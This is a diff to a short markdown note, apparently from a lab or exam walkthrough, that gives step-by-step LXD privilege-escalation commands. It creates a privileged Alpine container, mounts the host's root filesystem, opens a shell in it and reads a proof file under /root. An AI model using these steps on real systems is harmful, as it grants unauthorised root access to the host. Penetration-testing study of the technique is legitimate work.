@@ -12,7 +12,7 @@
 
     sudo ./build-alpine -a i686
 
-### Transfer to machine for rest of privesc
+### Transfer to machine for the rest of the privesc
 
 #### 1) 
 
@@ -30,18 +30,24 @@
 
 #### 5) 
 
-    lxc init myalpine jimmy -c security.privileged=true
+    lxc storage create default dir
+
+#### 6)
+
+    lxc init myalpine jimmy -c security.privileged=true -s default
 
 #### 6) 
 
     lxc config device add jimmy mydevice disk source=/ path=/mnt/root recursive=true
 
-#### 6) 
+#### 7) 
 
     lxc start jimmy
 
-#### 7) 
+#### 8) 
 
     lxc exec jimmy /bin/sh
 
 #### 8) GGWP!
+
+    cat /mnt/root/root/proof.txt
